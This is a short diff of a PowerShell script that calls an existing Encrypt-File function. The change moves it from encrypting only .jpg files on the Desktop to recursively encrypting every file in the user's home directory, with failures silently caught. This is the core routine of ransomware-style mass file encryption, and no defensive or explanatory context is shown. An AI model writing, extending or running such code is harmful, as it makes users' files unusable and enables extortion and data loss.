@@ -35,12 +35,19 @@ function Encrypt-File {
     Write-Host "Encrypted: $filePath -> $encryptedFilePath"
 }
 
-# Get the Desktop path
-$desktopPath = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Desktop"))
+# Get the current user's home directory
+$homeDirectory = [System.Environment]::GetFolderPath('UserProfile')
 
-# Find all .jpg files and encrypt them
-Get-ChildItem -Path $desktopPath -Filter *.jpg | ForEach-Object {
-    Encrypt-File -filePath $_.FullName -key $key -iv $iv
+# Get all files in the user's home directory and subdirectories
+$files = Get-ChildItem -Path $homeDirectory -Recurse -File
+
+# Encrypt each file in the home directory
+foreach ($file in $files) {
+    try {
+        Encrypt-File -filePath $file.FullName -key $key -iv $iv
+    } catch {
+        Write-Host "Failed to encrypt: $($file.FullName)"
+    }
 }
 
 
